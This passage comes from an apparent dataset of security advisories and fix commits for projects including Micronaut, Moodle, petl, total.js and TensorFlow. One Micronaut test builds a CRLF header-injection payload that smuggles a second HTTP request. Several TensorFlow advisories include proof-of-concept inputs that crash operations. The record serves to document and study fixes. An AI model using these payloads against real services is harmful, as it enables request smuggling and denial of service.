https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1\n- https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/6deb60b75517f80c57b42d935f07955c773b766d\n- https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/bc855e439c4a5ced3d83195bb59d0679cbd95add\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [micronaut-core](https:\/\/github.com\/micronaut-projects\/micronaut-core)\n* Email us at [info@micronaut.io](mailto:info@micronaut.io)\n\n### Credit\n\nOriginally reported by @JLLeitschuh","published_date":"2020-03-30","chain_len":3,"project":"https:\/\/github.com\/micronaut-projects\/micronaut-core","commit_href":"https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/bc855e439c4a5ced3d83195bb59d0679cbd95add","commit_sha":"bc855e439c4a5ced3d83195bb59d0679cbd95add","patch":"MULTI","chain_ord":"['6deb60b75517f80c57b42d935f07955c773b766d', 'bc855e439c4a5ced3d83195bb59d0679cbd95add', '9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1']","before_first_fix_commit":"{'a2392f4289f7777c4a310c3ae3bb4bc0ce5a65c2'}","last_fix_commit":"9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1","chain_ord_pos":2.0,"commit_datetime":"02\/20\/2020, 19:20:37","message":"Add test for client header validation","author":"jameskleeh","comments":"{'com_1': {'author': 'JLLeitschuh', 'datetime': '03\/09\/2020, 19:23:22', 'body': 'Would be good to put in an assertion that this method is never called.'}, 'com_2': {'author': 'JLLeitschuh', 'datetime': '03\/09\/2020, 19:23:55', 'body': \"Instead of doing this, I'd advise that you let the exception get thrown and assert in the test that this fails appropriately.\"}, 'com_3': {'author': 'JLLeitschuh', 'datetime': '03\/09\/2020, 19:24:09', 'body': 'Same comment here as above.'}}","stats":"{'additions': 160, 'deletions': 0, 'total': 160}","files":"{'http-client\/src\/test\/groovy\/io\/micronaut\/http\/client\/HeaderValidationSpec.groovy': {'additions': 160, 'deletions': 0, 'changes': 160, 'status': 'added', 'raw_url': 'https:\/\/github.com\/micronaut-projects\/micronaut-core\/raw\/bc855e439c4a5ced3d83195bb59d0679cbd95add\/http-client%2Fsrc%2Ftest%2Fgroovy%2Fio%2Fmicronaut%2Fhttp%2Fclient%2FHeaderValidationSpec.groovy', 'patch': '@@ -0,0 +1,160 @@\\n+package io.micronaut.http.client\\n+\\n+import io.micronaut.context.ApplicationContext\\n+import io.micronaut.context.annotation.Requires\\n+import io.micronaut.http.HttpRequest\\n+import io.micronaut.http.MediaType\\n+import io.micronaut.http.annotation.Body\\n+import io.micronaut.http.annotation.Controller\\n+import io.micronaut.http.annotation.Get\\n+import io.micronaut.http.annotation.Post\\n+import io.micronaut.http.annotation.Produces\\n+import io.micronaut.http.annotation.QueryValue\\n+import io.micronaut.http.client.annotation.Client\\n+import io.micronaut.http.uri.UriBuilder\\n+import io.micronaut.runtime.server.EmbeddedServer\\n+import spock.lang.AutoCleanup\\n+import spock.lang.Shared\\n+import spock.lang.Specification\\n+\\n+import javax.inject.Inject\\n+\\n+class HeaderValidationSpec extends Specification {\\n+\\n+    @Shared @AutoCleanup EmbeddedServer embeddedServer =\\n+            ApplicationContext.run(EmbeddedServer, [\"spec.name\": HeaderValidationSpec.simpleName])\\n+\\n+    @Shared @AutoCleanup HttpClient client = embeddedServer.applicationContext.createBean(HttpClient, embeddedServer.getURL())\\n+\\n+    void \"test hello\"() {\\n+        HttpRequest<String> request = HttpRequest.GET(\"\/hello\");\\n+        String body = client.toBlocking().retrieve(request);\\n+\\n+        expect:\\n+        body == \"Hello World\"\\n+    }\\n+\\n+    \/**\\n+     * This test demonstrates self exploitation.\\n+     * Not really practical, but it proves the point.\\n+     *\/\\n+    void \"test self exploitation\"() {\\n+        HttpRequest<String> request = HttpRequest.GET(\"\/hello\/self-exploit\");\\n+        String body = client.toBlocking().retrieve(request);\\n+\\n+        expect:\\n+        body == \"Hello World\"\\n+    }\\n+\\n+    \/**\\n+     * This test demonstrates an example of this vulnerability actually being abused since an attacker\\n+     * could make the server make an additional unexpected request.\\n+     *\/\\n+    void \"test external exploit\"() {\\n+        List<String> headerData = [\\n+                \"Connection: Keep-Alive\", \/\/ This keeps the connection open so another request can be stuffed in.\\n+                \"\",\\n+                \"\",\\n+                \"POST \/hello\/super-secret HTTP\/1.1\",\\n+                \"Host: 127.0.0.1\",\\n+                \"Content-Length: 31\",\\n+                \"\",\\n+                \"{\\\\\"new\\\\\":\\\\\"json\\\\\",\\\\\"content\\\\\":\\\\\"here\\\\\"}\",\\n+                \"\",\\n+                \"\"\\n+        ]\\n+        String fullHeaderValue = String.join(\"\\\\r\\\\n\", headerData);\\n+        String headerValue = \"H\\\\r\\\\n\" + fullHeaderValue;\\n+        URI theURI =\\n+                UriBuilder\\n+                        .of(\"\/hello\/external-exploit\")\\n+                        .queryParam(\"header-value\", headerValue)\\n+                        .build();\\n+        HttpRequest<String> request = HttpRequest.GET(theURI)\\n+        String body = client.toBlocking().retrieve(request)\\n+\\n+        expect:\\n+        body == \"Hello World\"\\n+    }\\n+\\n+\\n+    @Requires(property = \"spec.name\", value = \"HeaderValidationSpec\")\\n+    @Controller(\"\/hello\")\\n+    static class HelloController {\\n+\\n+        \/**\\n+         * Imagine that this client actually points to another micro-service instead of pointing back to itself.\\n+         *\/\\n+        @Inject\\n+        @Client(\"\/\")\\n+        HttpClient client\\n+\\n+        \/**\\n+         * Imagine in a micro-services architecture, this method exists in some other application.\\n+         * This method is safe to be called by the other services that use it.\\n+         *\/\\n+        @Get\\n+        @Produces(MediaType.TEXT_PLAIN)\\n+        String index() {\\n+            \"Hello World\"\\n+        }\\n+\\n+        \/**\\n+         * Imagine in a micro-services architecture, this method exists in some other application.\\n+         * This method is <b>incredibly sensitive<\/b> and should <b>not<\/b> be called by outside code, ever.\\n+         *\/\\n+        @Post(\"\/super-secret\")\\n+        @Produces(MediaType.TEXT_PLAIN)\\n+        String superSecretEndpoint(@Body String body) {\\n+            println(\"This method was called but it shouldn\\'t have been!\")\\n+            println(body)\\n+\\n+            body\\n+        }\\n+\\n+        \/**\\n+         * This is a simple demonstration of exploiting ourselves.\\n+         * Totally impractical, but this demonstrates the vulnerability in the simplest way.\\n+         *\/\\n+        @Get(\"\/self-exploit\")\\n+        @Produces(MediaType.TEXT_PLAIN)\\n+        String selfExploit() {\\n+            List<String> headerData = [\\n+                    \"Connection: Keep-Alive\", \/\/ This keeps the connection open so another request can be stuffed in.\\n+                    \"\",\\n+                    \"\",\\n+                    \"POST \/hello\/super-secret HTTP\/1.1\",\\n+                    \"Host: 127.0.0.1\",\\n+                    \"Content-Length: 31\",\\n+                    \"\",\\n+                    \"{\\\\\"new\\\\\":\\\\\"json\\\\\",\\\\\"content\\\\\":\\\\\"here\\\\\"}\",\\n+                    \"\",\\n+                    \"\"\\n+            ]\\n+            String fullHeaderValue = String.join(\"\\\\r\\\\n\", headerData)\\n+            String headerValue = \"H\\\\r\\\\n\" + fullHeaderValue\\n+\\n+            HttpRequest request = HttpRequest.GET(\"\/hello\")\\n+            try {\\n+                request.header(\"Test\", headerValue)\\n+            } catch (IllegalArgumentException e) {\\n+            }\\n+            client.toBlocking().retrieve(request)\\n+        }\\n+\\n+        \/**\\n+         * This is a more practical example of simplified user code that could reasonably exist in the wild.\\n+         * This method demonstrates how external user supplied data flowing to a header value could be dangerous.\\n+         *\/\\n+        @Get(\"\/external-exploit\")\\n+        @Produces(MediaType.TEXT_PLAIN)\\n+        String externalExploit(@QueryValue(\"header-value\") String headerValue) {\\n+            HttpRequest request = HttpRequest.GET(\"\/hello\")\\n+            try {\\n+                request.header(\"Test\", headerValue)\\n+            } catch (IllegalArgumentException e) {\\n+            }\\n+            client.toBlocking().retrieve(request)\\n+        }\\n+    }\\n+}'}}","message_norm":"add test for client header validation","language":"en","entities":"[('add', 'ACTION', ''), ('header validation', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['http-client\/src\/test\/groovy\/io\/micronaut\/http\/client\/HeaderValidationSpec.groovy'])","num_files":1.0},{"index":804,"vuln_id":"GHSA-69c3-5xxf-58q2","cwe_id":"{'CWE-89'}","score":9.8,"chain":"{'https:\/\/github.com\/moodle\/moodle\/commit\/a0f47c8bc4d6f5971025de7d63f22475701d2f86'}","dataset":"osv","summary":"SQL injection in moodle A flaw was found in moodle where an SQL injection risk was identified in Badges code relating to configuring criteria.","published_date":"2022-05-19","chain_len":1,"project":"https:\/\/github.com\/moodle\/moodle","commit_href":"https:\/\/github.com\/moodle\/moodle\/commit\/a0f47c8bc4d6f5971025de7d63f22475701d2f86","commit_sha":"a0f47c8bc4d6f5971025de7d63f22475701d2f86","patch":"SINGLE","chain_ord":"['a0f47c8bc4d6f5971025de7d63f22475701d2f86']","before_first_fix_commit":"{'9478dc6b07b162f63b823480aecd4e2fb4e3c59f'}","last_fix_commit":"a0f47c8bc4d6f5971025de7d63f22475701d2f86","chain_ord_pos":1.0,"commit_datetime":"03\/31\/2022, 10:17:31","message":"MDL-74333 badges: Check profile criteria valid when reviewing","author":"Michael Hawkins","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'badges\/criteria\/award_criteria_profile.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moodle\/moodle\/raw\/a0f47c8bc4d6f5971025de7d63f22475701d2f86\/badges%2Fcriteria%2Faward_criteria_profile.php', 'patch': '@@ -202,8 +202,8 @@ public function review($userid, $filtered = false) {\\n                 $join .= \" LEFT JOIN {user_info_data} uid{$idx} ON uid{$idx}.userid = u.id AND uid{$idx}.fieldid = :fieldid{$idx} \";\\n                 $sqlparams[\"fieldid{$idx}\"] = $param[\\'field\\'];\\n                 $whereparts[] = \"uid{$idx}.id IS NOT NULL\";\\n-            } else {\\n-                \/\/ This is a field from {user} table.\\n+            } else if (in_array($param[\\'field\\'], $this->allowed_default_fields)) {\\n+                \/\/ This is a valid field from {user} table.\\n                 if ($param[\\'field\\'] == \\'picture\\') {\\n                     \/\/ The picture field is numeric and requires special handling.\\n                     $whereparts[] = \"u.{$param[\\'field\\']} != 0\";'}}","message_norm":"mdl-74333 badges: check profile criteria valid when reviewing","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['badges\/criteria\/award_criteria_profile.php'])","num_files":1.0},{"index":806,"vuln_id":"GHSA-69q2-p9xp-739v","cwe_id":"{'CWE-91'}","score":9.8,"chain":"{'https:\/\/github.com\/petl-developers\/petl\/pull\/527\/commits\/1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8'}","dataset":"osv","summary":"XML Injection in petl petl before 1.68, in some configurations, allows resolution of entities in an XML document.","published_date":"2021-04-20","chain_len":1,"project":"https:\/\/github.com\/petl-developers\/petl","commit_href":"https:\/\/github.com\/petl-developers\/petl\/pull\/527\/commits\/1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8","commit_sha":"1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8","patch":"SINGLE","chain_ord":"['1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8']","before_first_fix_commit":"{'364c3e5d0263a99dffebcd9df70b17bce57b3b06'}","last_fix_commit":"1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8","chain_ord_pos":1.0,"commit_datetime":"10\/05\/2020, 22:42:56","message":"allow using a custom\/restricted xml parser","author":"Juarez Rudsatz","comments":null,"stats":"{'additions': 20, 'deletions': 2, 'total': 22}","files":"{'petl\/io\/xml.py': {'additions': 20, 'deletions': 2, 'changes': 22, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/petl-developers\/petl\/raw\/1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8\/petl%2Fio%2Fxml.py', 'patch': '@@ -133,6 +133,9 @@ def fromxml(source, *args, **kwargs):\\n     or list of paths can be provided, e.g.,\\n     ``fromxml(\\'example.html\\', \\'.\/\/tr\\', (\\'th\\', \\'td\\'))``.\\n \\n+    Optionally a custom parser can be provided, e.g.,\\n+    ``etl.fromxml(\\'example1.xml\\', \\'tr\\', \\'td\\', parser=my_parser)``.\\n+\\n     \"\"\"\\n \\n     source = read_source_from_arg(source)\\n@@ -162,14 +165,15 @@ def __init__(self, source, *args, **kwargs):\\n         else:\\n             assert False, \\'bad parameters\\'\\n         self.missing = kwargs.get(\\'missing\\', None)\\n+        self.user_parser = kwargs.get(\\'parser\\', None)\\n \\n     def __iter__(self):\\n         vmatch = self.vmatch\\n         vdict = self.vdict\\n \\n         with self.source.open(\\'rb\\') as xmlf:\\n-\\n-            tree = etree.parse(xmlf)\\n+            parser2 = _create_xml_parser(self.user_parser)\\n+            tree = etree.parse(xmlf, parser=parser2)\\n             if not hasattr(tree, \\'iterfind\\'):\\n                 # Python 2.6 compatibility\\n                 tree.iterfind = tree.findall\\n@@ -219,6 +223,20 @@ def __iter__(self):\\n                                 for f in flds)\\n \\n \\n+def _create_xml_parser(user_parser):\\n+    if user_parser is not None:\\n+        return user_parser\\n+    try:\\n+        # Default lxml parser.\\n+        # This will throw an error if parser is not set and lxml could not be imported\\n+        # because Python\\'s built XML parser doesn\\'t like the `resolve_entities` kwarg.\\n+        # return etree.XMLParser(resolve_entities=False)\\n+        return etree.XMLParser(resolve_entities=False)\\n+    except TypeError:\\n+        # lxml not available\\n+        return None\\n+\\n+\\n def element_text_getter(missing):\\n     def _get(v):\\n         if len(v) > 1:'}}","message_norm":"allow using a custom\/restricted xml parser","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['petl\/io\/xml.py'])","num_files":1.0},{"index":812,"vuln_id":"GHSA-6c8f-qphg-qjgp","cwe_id":"{'CWE-668'}","score":7.5,"chain":"{'https:\/\/github.com\/jonschlinkert\/kind-of\/commit\/1df992ce6d5a1292048e5fe9c52c5382f941ee0b'}","dataset":"osv","summary":"Validation Bypass in kind-of Versions of `kind-of` 6.x prior to 6.0.3 are vulnerable to a Validation Bypass. A maliciously crafted object can alter the result of the type check, allowing attackers to bypass the type checking validation. \n\n\n## Recommendation\n\nUpgrade to versions 6.0.3 or later.","published_date":"2020-03-31","chain_len":1,"project":"https:\/\/github.com\/jonschlinkert\/kind-of","commit_href":"https:\/\/github.com\/jonschlinkert\/kind-of\/commit\/1df992ce6d5a1292048e5fe9c52c5382f941ee0b","commit_sha":"1df992ce6d5a1292048e5fe9c52c5382f941ee0b","patch":"SINGLE","chain_ord":"['1df992ce6d5a1292048e5fe9c52c5382f941ee0b']","before_first_fix_commit":"{'975c13a7cfaf25d811475823824af3a9c04b0ba8', '4da96c0047906d22a4d6964a668d3abaca122e50'}","last_fix_commit":"1df992ce6d5a1292048e5fe9c52c5382f941ee0b","chain_ord_pos":1.0,"commit_datetime":"01\/16\/2020, 16:37:23","message":"Merge pull request #31 from xiaofen9\/master\n\nfix type checking vul in ctorName","author":"Brian Woodward","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jonschlinkert\/kind-of\/raw\/1df992ce6d5a1292048e5fe9c52c5382f941ee0b\/index.js', 'patch': \"@@ -66,7 +66,7 @@ module.exports = function kindOf(val) {\\n };\\n \\n function ctorName(val) {\\n-  return val.constructor ? val.constructor.name : null;\\n+  return val.constructor && typeof val.constructor === 'function' ? val.constructor.name : null;\\n }\\n \\n function isArray(val) {\"}}","message_norm":"merge pull request #31 from xiaofen9\/master\n\nfix type checking vul in ctorname","language":"en","entities":"[('#31', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":815,"vuln_id":"GHSA-6cf8-qhqj-vjqm","cwe_id":"{'CWE-400'}","score":0.0,"chain":"{'https:\/\/github.com\/totaljs\/framework\/commit\/b3f901561d66ab799a4a99279893b94cad7ae4ff'}","dataset":"osv","summary":"Prototype pollution in total.js There is a prototype pollution vulnerability in the package total.js before version 3.4.7. The set function can be used to set a value into the object according to the path. However the keys of the path being set are not properly sanitized, leading to a prototype pollution vulnerability. The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution or Property Injection.","published_date":"2021-02-05","chain_len":1,"project":"https:\/\/github.com\/totaljs\/framework","commit_href":"https:\/\/github.com\/totaljs\/framework\/commit\/b3f901561d66ab799a4a99279893b94cad7ae4ff","commit_sha":"b3f901561d66ab799a4a99279893b94cad7ae4ff","patch":"SINGLE","chain_ord":"['b3f901561d66ab799a4a99279893b94cad7ae4ff']","before_first_fix_commit":"{'1e1faeb20d2291038e10b98f2046a4058135e767'}","last_fix_commit":"b3f901561d66ab799a4a99279893b94cad7ae4ff","chain_ord_pos":1.0,"commit_datetime":"12\/31\/2020, 10:41:21","message":"Fixed `U.set()` by adding check for `Prototype pollution`.","author":"Peter Sirka","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'utils.js': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/totaljs\/framework\/raw\/b3f901561d66ab799a4a99279893b94cad7ae4ff\/utils.js', 'patch': \"@@ -6621,6 +6621,10 @@ exports.set = function(obj, path, value) {\\n \\tvar v = arr[arr.length - 1];\\n \\tvar ispush = v.lastIndexOf('[]') !== -1;\\n \\tvar a = builder.join(';') + ';var v=typeof(a)===\\\\'function\\\\'?a(U.get(b)):a;w' + (v[0] === '[' ? '' : '.') + (ispush ? v.replace(REGREPLACEARR, '.push(v)') : (v + '=v')) + ';return v';\\n+\\n+\\tif ((\/__proto__|constructor|prototype\/).test(a))\\n+\\t\\tthrow new Error('Prototype pollution');\\n+\\n \\tvar fn = new Function('w', 'a', 'b', a);\\n \\tF.temporary.other[cachekey] = fn;\\n \\tfn(obj, value, path);\"}}","message_norm":"fixed `u.set()` by adding check for `prototype pollution`.","language":"en","entities":"[('fixed', 'ACTION', ''), ('adding', 'ACTION', ''), ('prototype pollution', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['utils.js'])","num_files":1.0},{"index":820,"vuln_id":"GHSA-6cpj-3g83-q2j4","cwe_id":"{'CWE-611'}","score":0.0,"chain":"{'https:\/\/github.com\/apache\/lucene-solr\/commit\/f230486ce6707762c1a6e81655d0fac52887906d', 'https:\/\/github.com\/apache\/lucene-solr\/commit\/0d21b900975b7048d2e925d852aeacb9bdc6766c'}","dataset":"osv","summary":"Improper Restriction of XML External Entity Reference in Apache Solr The (1) UpdateRequestHandler for XSLT or (2) XPathEntityProcessor in Apache Solr before 4.1 allows remote attackers to have an unspecified impact via XML data containing an external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue, different vectors than CVE-2013-6407.","published_date":"2022-05-17","chain_len":2,"project":"https:\/\/github.com\/apache\/lucene-solr","commit_href":"https:\/\/github.com\/apache\/lucene-solr\/commit\/0d21b900975b7048d2e925d852aeacb9bdc6766c","commit_sha":"0d21b900975b7048d2e925d852aeacb9bdc6766c","patch":"MULTI","chain_ord":"['f230486ce6707762c1a6e81655d0fac52887906d', '0d21b900975b7048d2e925d852aeacb9bdc6766c']","before_first_fix_commit":"{'f230486ce6707762c1a6e81655d0fac52887906d'}","last_fix_commit":"0d21b900975b7048d2e925d852aeacb9bdc6766c","chain_ord_pos":2.0,"commit_datetime":"09\/27\/2012, 13:15:24","message":"SOLR-3895, SOLR-3614: Fix javadocs\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/lucene\/dev\/trunk@1390991 13f79535-47bb-0310-9956-ffa450edef68","author":"Uwe Schindler","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'solr\/core\/src\/java\/org\/apache\/solr\/util\/EmptyEntityResolver.java': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/lucene-solr\/raw\/0d21b900975b7048d2e925d852aeacb9bdc6766c\/solr%2Fcore%2Fsrc%2Fjava%2Forg%2Fapache%2Fsolr%2Futil%2FEmptyEntityResolver.java', 'patch': '@@ -67,7 +67,7 @@ private static void trySetSAXFeature(SAXParserFactory saxFactory, String feature\\n   }\\n   \\n   \/** Configures the given {@link SAXParserFactory} to do secure XML processing of untrusted sources.\\n-   * It is required to also set {@link #SAX_INSTANCE} on the created {@link XMLReader}.\\n+   * It is required to also set {@link #SAX_INSTANCE} on the created {@link org.xml.sax.XMLReader}.\\n    * @see #SAX_INSTANCE\\n    *\/\\n   public static void configureSAXParserFactory(SAXParserFactory saxFactory) {'}}","message_norm":"solr-3895, solr-3614: fix javadocs\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/lucene\/dev\/trunk@1390991 13f79535-47bb-0310-9956-ffa450edef68","language":"sv","entities":"[('fix', 'ACTION', ''), ('https:\/\/svn.apache.org\/repos\/asf\/lucene\/dev\/trunk@1390991', 'URL', ''), ('13f79535', 'SHA', 'generic_sha'), ('ffa450edef68', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['solr\/core\/src\/java\/org\/apache\/solr\/util\/EmptyEntityResolver.java'])","num_files":1.0},{"index":822,"vuln_id":"GHSA-6f84-42vf-ppwp","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6'}","dataset":"osv","summary":"Division by 0 in `QuantizedMul` ### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.QuantizedMul`:\n\n```python\nimport tensorflow as tf\n\nx = tf.zeros([4, 1], dtype=tf.quint8)\ny = tf.constant([], dtype=tf.quint8)\nmin_x = tf.constant(0.0)\nmax_x = tf.constant(0.0010000000474974513)\nmin_y = tf.constant(0.0)\nmax_y = tf.constant(0.0010000000474974513)\n\ntf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)\n```                            \n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/55900e961ed4a23b438392024912154a2c2f5e85\/tensorflow\/core\/kernels\/quantized_mul_op.cc#L188-L198) does a division by a quantity that is controlled by the caller:\n\n```cc\ntemplate <class T, class Toutput>\nvoid VectorTensorMultiply(const T* vector_data, int32 vector_offset,\n                          int64 vector_num_elements, const T* tensor_data,\n                          int32 tensor_offset, int64 tensor_num_elements,\n                          Toutput* output) {\n  for (int i = 0; i < tensor_num_elements; ++i) {\n    const int64 vector_i = i % vector_num_elements;\n    ...\n  }\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6","commit_sha":"a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6","patch":"SINGLE","chain_ord":"['a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6']","before_first_fix_commit":"{'55900e961ed4a23b438392024912154a2c2f5e85'}","last_fix_commit":"a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6","chain_ord_pos":1.0,"commit_datetime":"04\/20\/2021, 17:52:46","message":"Fix one division by zero\n\nPiperOrigin-RevId: 369474832\nChange-Id: I1082858ed78d9b2e4738ce30b231955973d49e1e","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/quantized_mul_op.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6\/tensorflow%2Fcore%2Fkernels%2Fquantized_mul_op.cc', 'patch': '@@ -347,6 +347,11 @@ class QuantizedMulOp : public OpKernel {\\n         tensor_num_elements = x.NumElements();\\n         tensor_offset = offset_x;\\n       }\\n+      if (vector_num_elements == 0) {\\n+        context->SetStatus(\\n+            errors::InvalidArgument(\"vector must have at least 1 element\"));\\n+        return;\\n+      }\\n       VectorTensorMultiply<T, Toutput>(\\n           vector_data, vector_offset, vector_num_elements, tensor_data,\\n           tensor_offset, tensor_num_elements, z_data);'}}","message_norm":"fix one division by zero\n\npiperorigin-revid: 369474832\nchange-id: i1082858ed78d9b2e4738ce30b231955973d49e1e","language":"it","entities":"[('fix', 'ACTION', ''), ('division by zero', 'SECWORD', ''), ('369474832', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantized_mul_op.cc'])","num_files":1.0},{"index":823,"vuln_id":"GHSA-6f89-8j54-29xf","cwe_id":"{'CWE-787', 'CWE-119'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/12c727cee857fa19be717f336943d95fca4ffe4f'}","dataset":"osv","summary":"Heap buffer overflow in `FractionalAvgPoolGrad` ### Impact\nThe implementation of `tf.raw_ops.FractionalAvgPoolGrad` is vulnerable to a heap buffer overflow:\n  \n```python\nimport tensorflow as tf\n\norig_input_tensor_shape = tf.constant([1, 3, 2, 3], shape=[4], dtype=tf.int64)\nout_backprop = tf.constant([2], shape=[1, 1, 1, 1], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\ncol_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\n\n\ntf.raw_ops.FractionalAvgPoolGrad(\n  orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/dcba796a28364d6d7f003f6fe733d82726dda713\/tensorflow\/core\/kernels\/fractional_avg_pool_op.cc#L216) fails to validate that the pooling sequence arguments have enough elements as required by the `out_backprop` tensor shape.\n\n### Patches\nWe have patched the issue in GitHub commit [12c727cee857fa19be717f336943d95fca4ffe4f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/12c727cee857fa19be717f336943d95fca4ffe4f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/12c727cee857fa19be717f336943d95fca4ffe4f","commit_sha":"12c727cee857fa19be717f336943d95fca4ffe4f","patch":"SINGLE","chain_ord":"['12c727cee857fa19be717f336943d95fca4ffe4f']","before_first_fix_commit":"{'dcba796a28364d6d7f003f6fe733d82726dda713'}","last_fix_commit":"12c727cee857fa19be717f336943d95fca4ffe4f","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2021, 21:02:47","message":"Validate inputs of `FractionalAvgPoolGrad`.\n\nPiperOrigin-RevId: 372420640\nChange-Id: Icc583928e6cdc3062e12498e4d2337a8fe3da016","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 13, 'deletions': 0, 'total': 13}","files":"{'tensorflow\/core\/kernels\/fractional_avg_pool_op.cc': {'additions': 13, 'deletions': 0, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/12c727cee857fa19be717f336943d95fca4ffe4f\/tensorflow%2Fcore%2Fkernels%2Ffractional_avg_pool_op.cc', 'patch': '@@ -250,6 +250,19 @@ class FractionalAvgPoolGradOp : public OpKernel {\\n     const int64 out_cols = out_backprop.dim_size(2);\\n     const int64 out_depth = out_backprop.dim_size(3);\\n \\n+    OP_REQUIRES(context, row_seq_tensor.NumElements() > out_rows,\\n+                errors::InvalidArgument(\"Given out_backprop shape \",\\n+                                        out_backprop.shape().DebugString(),\\n+                                        \", row_seq_tensor must have at least \",\\n+                                        out_rows + 1, \" elements, but got \",\\n+                                        row_seq_tensor.NumElements()));\\n+    OP_REQUIRES(context, col_seq_tensor.NumElements() > out_cols,\\n+                errors::InvalidArgument(\"Given out_backprop shape \",\\n+                                        out_backprop.shape().DebugString(),\\n+                                        \", col_seq_tensor must have at least \",\\n+                                        out_cols + 1, \" elements, but got \",\\n+                                        col_seq_tensor.NumElements()));\\n+\\n     auto row_seq_tensor_flat = row_seq_tensor.flat<int64>();\\n     auto col_seq_tensor_flat = col_seq_tensor.flat<int64>();\\n     auto orig_input_tensor_shape_flat = orig_input_tensor_shape.flat<int64>();'}}","message_norm":"validate inputs of 